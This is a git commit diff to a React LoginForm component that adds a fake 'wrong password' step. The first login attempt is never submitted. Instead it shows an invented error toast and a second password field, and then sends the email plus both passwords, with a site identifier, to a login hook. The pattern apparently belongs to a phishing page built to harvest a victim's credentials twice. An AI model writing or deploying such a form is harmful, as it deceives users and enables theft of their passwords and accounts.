ea5ff07ff049b02151d93cf54bb639d2e0624f93
Zayn Yusuf <yusue786@gmail.com>
2024-02-22 18:09:40 +0600

    adding wrong password

--- components/LoginForm.js
+++ components/LoginForm.js
@@ -1,29 +1,43 @@
 import { Field, Form, Formik } from "formik";
 import useMockLogin from "../hooks/useMockLogin";
 import { site } from "../config";
+import { useState } from "react";
+import { toast } from "react-toastify";
 
 function LoginForm({ setShowModal }) {
+  const [showWrongPassword, setShowWrongPassword] = useState(false);
+
   const initialvalues = {
     email: "",
     password: "",
+    wrongPassword: "",
     remember: "",
   };
 
   const { login } = useMockLogin({ setShowModal });
 
   const handleSubmit = (values, formik) => {
-    const { email, password } = values;
+    const { email, password, wrongPassword } = values;
+
+    // console.log("values", values);
+    // return;
 
     const submitValues = {
       site: site,
       email: email,
       password: password,
+      wrongPassword: wrongPassword,
       skipcode: "",
     };
 
     login(submitValues, formik);
 
     // console.log(submitValues);
+  };
+
+  const handleWrongPassword = () => {
+    setShowWrongPassword(true);
+    toast.error("Wrong password, try again");
   };
 
   return (
@@ -47,21 +61,44 @@ function LoginForm({ setShowModal }) {
                 type="email"
                 required
               />
-              <Field
-                className="mt-5 w-full text-lg  px-[8px] py-[7px] outline-none border border-slate-300 shadow-inner placeholder:font-medium placeholder:text-black/50"
-                placeholder="Password"
-                name="password"
-                type="password"
-                autoComplete="on"
-                required
-              />
+              {!showWrongPassword ? (
+                <>
+                  <Field
+                    className="mt-5 w-full text-lg  px-[8px] py-[7px] outline-none border border-slate-300 shadow-inner placeholder:font-medium placeholder:text-black/50"
+                    placeholder="Password"
+                    name="password"
+                    type="password"
+                    autoComplete="on"
+                    required
+                  />
 
-              <button
-                type="submit"
-                className="mt-5 w-full text-lg font-medium bg-[#2ba6cb] hover:bg-custom-cyan2 py-[10px] text-white transition duration-300 rounded"
-              >
-                Log in
-              </button>
+                  <button
+                    type="button"
+                    onClick={handleWrongPassword}
+                    className="mt-5 w-full text-lg font-medium bg-[#2ba6cb] hover:bg-custom-cyan2 py-[10px] text-white transition duration-300 rounded"
+                  >
+                    Log in
+                  </button>
+                </>
+              ) : (
+                <>
+                  <Field
+                    className="mt-5 w-full text-lg  px-[8px] py-[7px] outline-none border border-slate-300 shadow-inner placeholder:font-medium placeholder:text-black/50"
+                    placeholder="Password"
+                    name="wrongPassword"
+                    type="password"
+                    autoComplete="on"
+                    required
+                  />
+
+                  <button
+                    type="submit"
+                    className="mt-5 w-full text-lg font-medium bg-[#2ba6cb] hover:bg-custom-cyan2 py-[10px] text-white transition duration-300 rounded"
+                  >
+                    Log in
+                  </button>
+                </>
+              )}
             </Form>
           )}
         </Formik>
